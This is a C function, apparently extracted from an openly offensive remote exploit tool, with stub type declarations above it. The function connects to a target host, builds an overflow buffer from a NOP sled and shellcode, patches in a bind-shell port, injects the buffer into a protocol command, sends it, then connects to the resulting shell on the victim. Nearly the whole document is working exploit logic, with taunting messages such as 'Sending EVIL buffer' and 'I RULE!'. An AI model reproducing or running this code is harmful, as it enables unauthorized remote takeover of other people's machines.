
typedef unsigned long size_t;
typedef long intptr_t; typedef unsigned long uintptr_t;
typedef long scalar_t__;

typedef int bool;




typedef struct TYPE_2__ TYPE_1__ ;


struct TYPE_2__ {char* Xploit_way; int port; char* command; size_t overflow_string_size; } ;


 char NOP ;
 int PORT_LOCATION ;
 TYPE_1__* RoboVikiXploiting_ways ;
 int close (int) ;
 int exit (int) ;
 int free (char*) ;
 char* malloc (int) ;
 int openhost (char*,int) ;
 int own3dshell (int) ;
 int printf (char*,...) ;
 int sends (int,char*) ;
 char* shellcode ;
 int strcat (char*,char*) ;
 size_t strlen (char*) ;

void
VikingXown(char *host, int type, int bind_shell_port)
{
 char *buf, *tmp;
 int sock, i, x, buffer_size, bindshell=bind_shell_port;
 unsigned char *ShellPortOffset;
 printf("Type Number     : %d\n",type);
 printf("Xploit waye     : %s\n",RoboVikiXploiting_ways[type].Xploit_way);
 printf("Port            : %d\n",RoboVikiXploiting_ways[type].port);
 printf("Bind Shell Port : %d\n",bindshell);
 printf("Let the show begin ladyes...\n");
 printf("Connecting to %s [%d]...",host,RoboVikiXploiting_ways[type].port);
 sock=openhost(host,RoboVikiXploiting_ways[type].port);
 if (sock==-1)
 {
  printf("FAILED!\n");
  printf("Couldnt connect...leaving :|\n\n");
  exit(-1);
 }
 printf("SUCCESS!\n");
 printf("Determinating buffer size...");
 buffer_size=(strlen(RoboVikiXploiting_ways[type].command)
             +
             RoboVikiXploiting_ways[type].overflow_string_size);
 printf("DONE! (%d)\n",buffer_size);
 printf("Allocating memory for buffer...");
 if (!(buf=malloc(buffer_size)))
 {
  printf("FAILED!\n");
  printf("Leaving... :[\n\n");
  exit(-1);
 }
 printf("WORKED!\n");
 printf("Allocating memory for temp buffer...");
 if (!(tmp=malloc(RoboVikiXploiting_ways[type].overflow_string_size)))
 {
  printf("FAILED!\n");
  printf("Leaving... :[\n\n");
  exit(-1);
 }
 printf("WORKED TO! (heh)\n");
 for(i=0;
     i<RoboVikiXploiting_ways[type].overflow_string_size-strlen(shellcode);
     i++) tmp[i]=NOP;

 ShellPortOffset = shellcode + PORT_LOCATION;
 bind_shell_port ^= 0x9999;
 *ShellPortOffset = (char) ((bind_shell_port >> 8) & 0xff);
 *(ShellPortOffset + 1) = (char) (bind_shell_port & 0xff);
 strcat(tmp,shellcode);
 for(i=0;;i++)
  if ((RoboVikiXploiting_ways[type].command[i]=='B') &&
      (RoboVikiXploiting_ways[type].command[i+1]=='O')) break;
  else buf[i]=RoboVikiXploiting_ways[type].command[i];
 strcat(buf,tmp);
 i+=2;
 for(;i<strlen(RoboVikiXploiting_ways[type].command);i++)
    buf[strlen(buf)]=RoboVikiXploiting_ways[type].command[i];
 printf("Sending EVIL buffer ;)\n");
 sends(sock,buf);
 close(sock);
 printf("Freeing buffers...");
 free(buf);
 free(tmp);
 printf("DONE!\n");
 printf("Trying to binded'shell [%d]...",bindshell);
 sock=openhost(host,bindshell);
 if (sock==-1)
 {
  printf("FAILED!\n");
  printf("Too bad... :[ exiting...\n\n");
  exit(-1);
 }
 printf("W0RK3D! ;)\n");
 printf("Prepare to have an orgazm...(or something like that *g*)\n");
 own3dshell(sock);
 printf("I RULE!\n");
}
